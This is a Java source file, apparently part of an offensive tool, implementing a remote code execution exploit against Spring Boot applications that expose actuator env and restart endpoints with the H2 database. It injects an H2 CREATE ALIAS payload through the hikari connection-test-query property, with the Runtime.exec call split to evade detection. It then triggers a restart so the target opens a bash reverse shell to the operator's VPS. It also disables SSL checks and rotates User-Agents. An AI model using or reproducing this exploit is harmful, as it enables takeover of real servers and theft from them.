package src.main.module;

import src.main.common.UA_Config;
import src.main.impl.ResultCallback;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.List;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Stream;

import static src.main.SSLVerify.sslVer.disableSSLVerification;

public class H2DataQueryRCE {
    private String address;
    public  String text;
    private String vpsIP;
    private String vpsPort;
    public static String cmdtmp ="bash -i >&/dev/tcp/%s/%s 0>&1";
    public String expData1 = "spring.datasource.hikari.connection-test-query=CREATE ALIAS %s AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL %s('/bin/bash','/c','%s');";
    public String expData2 = "{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS %s AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL %s('/bin/bash','-c','%s');\"}";
    public String flag = "T";
    public static int count;
    public H2DataQueryRCE(String address,String vpsIP,String vpsPort){
        this.address = address;
        this.vpsIP = vpsIP;
        this.vpsPort = vpsPort;
    }
    public void Result1(ResultCallback callback){
        String api = "/env";
        String site = address + api;
        String restapi = "/restart";
        String restsite = address + restapi;
        String llib = "h2database";
        String data = "";
        String ua = "";
        disableSSLVerification();
        String cmd = String.format(cmdtmp,vpsIP,vpsPort);
        count = (int) (Math.random() * 9000) + 1000;
        flag = "T" + String.valueOf(count);
        data = String.format(expData1,flag,flag,cmd);
        try{
            URL obj = new URL(site);
            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
            UA_Config uacf = new UA_Config();
            List<String> ualist = uacf.loadUserAgents();
            ua = uacf.getRandomUserAgent(ualist);
            conn.setRequestProperty("User-Agent",ua);
            conn.setRequestMethod("GET");
            int responseCode = conn.getResponseCode();
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            in.close();
            if (responseCode == HttpURLConnection.HTTP_OK && (response.toString().contains(llib))) {
                String regex = llib + "/h2/" + "(\\d+\\.\\d+\\.\\d+)";
                Pattern pattern = Pattern.compile(regex);
                Matcher matcher = pattern.matcher(response.toString());
                if (matcher.find()) {
                    text = String.format("h2database 依赖为: %s", matcher.group(1));
                    callback.onResult(text);
                    URL obj1 = new URL(site);
                    HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
                    ua = uacf.getRandomUserAgent(ualist);
                    conn1.setRequestProperty("User-Agent",ua);
                    conn1.setRequestMethod("POST");
                    conn1.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
                    conn1.setDoOutput(true);
                    try (OutputStream os = conn1.getOutputStream()) {
                        byte[] input = data.getBytes(StandardCharsets.UTF_8);
                        os.write(input, 0, input.length);
                    }
                    int responseCode1 = conn1.getResponseCode();
                    if (responseCode1 == HttpURLConnection.HTTP_OK){
                        ++count;
                        URL obj2 = new URL(restsite);
                        HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
                        ua = uacf.getRandomUserAgent(ualist);
                        conn2.setRequestProperty("User-Agent",ua);
                        conn2.setRequestMethod("POST");
                        conn2.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
                        conn2.setDoOutput(true);
                        int responseCode2 = conn2.getResponseCode();
                        if (responseCode2 == HttpURLConnection.HTTP_OK){
                            text = "命令执行成功，请在vps上查看信息";
                            callback.onResult(text);
                            text = "当前监听vpsIP： " + vpsIP + "vpsPort: " + vpsPort;
                            callback.onResult(text);
                        }
                    }else{
                        text = "发送restart失败，请重试";
                        callback.onResult(text);
                    }
                }
                else {
                    text = "未找到h2database依赖";
                    callback.onResult(text);
                }
            }else{
                text = "发送请求失败，请重试";
                callback.onResult(text);
            }
        }catch (Exception e){
            text = "发起请求异常";
            callback.onResult(text);
            e.printStackTrace();
        }
    }
    public void Result2(ResultCallback callback){
        String api = "/actuator/env";
        String site = address + api;
        String restapi = "/actuator/restart";
        String restsite = address + restapi;
        String llib = "h2database";
        String data = "";
        String ua = "";
        disableSSLVerification();
        String cmd = String.format(cmdtmp,vpsIP,vpsPort);
        count = (int) (Math.random() * 9000) + 1000;
        flag = "T" + String.valueOf(count);
        data = String.format(expData2,flag,flag,cmd);
        try{
            URL obj = new URL(site);
            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
            UA_Config uacf = new UA_Config();
            List<String> ualist = uacf.loadUserAgents();
            ua = uacf.getRandomUserAgent(ualist);
            conn.setRequestProperty("User-Agent",ua);
            conn.setRequestMethod("GET");
            int responseCode = conn.getResponseCode();
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            in.close();
            if (responseCode == HttpURLConnection.HTTP_OK && (response.toString().contains(llib))) {
                String regex = llib + "/h2/" + "(\\d+\\.\\d+\\.\\d+)";
                Pattern pattern = Pattern.compile(regex);
                Matcher matcher = pattern.matcher(response.toString());
                if (matcher.find()) {
                    text = String.format("h2database 依赖为: %s", matcher.group(1));
                    callback.onResult(text);
                    URL obj1 = new URL(site);
                    HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
                    ua = uacf.getRandomUserAgent(ualist);
                    conn1.setRequestProperty("User-Agent",ua);
                    conn1.setRequestMethod("POST");
                    conn1.setRequestProperty("Content-Type","application/json");
                    conn1.setDoOutput(true);
                    try (OutputStream os = conn1.getOutputStream()) {
                        byte[] input = data.getBytes(StandardCharsets.UTF_8);
                        os.write(input, 0, input.length);
                    }
                    int responseCode1 = conn1.getResponseCode();
                    if (responseCode1 == HttpURLConnection.HTTP_OK){
                        ++count;
                        URL obj2 = new URL(restsite);
                        HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
                        ua = uacf.getRandomUserAgent(ualist);
                        conn2.setRequestProperty("User-Agent",ua);
                        conn2.setRequestMethod("POST");
                        conn2.setRequestProperty("Content-Type","application/json");
                        conn2.setDoOutput(true);
                        int responseCode2 = conn2.getResponseCode();
                        if (responseCode2 == HttpURLConnection.HTTP_OK){
                            text = "命令执行成功，请在vps上查看信息";
                            callback.onResult(text);
                            text = "当前监听vpsIP： " + vpsIP + "vpsPort: " + vpsPort;
                            callback.onResult(text);
                        }
                    }else{
                        text = "发送restart失败，请重试";
                        callback.onResult(text);
                    }
                }
                else {
                    text = "未找到h2database依赖";
                    callback.onResult(text);
                }
            }else{
                text = "发送请求失败，请重试";
                callback.onResult(text);
            }
        }catch (Exception e){
            text = "发起请求异常";
            callback.onResult(text);
            e.printStackTrace();
        }
    }
    public void Exp(ResultCallback callback){
        String api ="/actuator/env";
        String site = address + api;
        String ua = "";
        disableSSLVerification();
        try{
            URL obj = new URL(site);
            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
            UA_Config uacf = new UA_Config();
            List<String> ualist = uacf.loadUserAgents();
            ua = uacf.getRandomUserAgent(ualist);
            conn.setRequestProperty("User-Agent",ua);
            conn.setRequestMethod("GET");
            int responseCode = conn.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                // 存在路径是springboot2，否则是springboot1
                text = "当前版本为springboot2";
                callback.onResult(text);
                Result2(callback);
            }else if (responseCode == HttpURLConnection.HTTP_NOT_FOUND){
                text = "当前版本为springboot1";
                callback.onResult(text);
                Result1(callback);
            }else{
                text = "未识别springboot版本";
                callback.onResult(text);
            }
        }catch (IOException e){
            text = "发起请求异常";
            callback.onResult(text);
            e.printStackTrace();
        }
    }
}
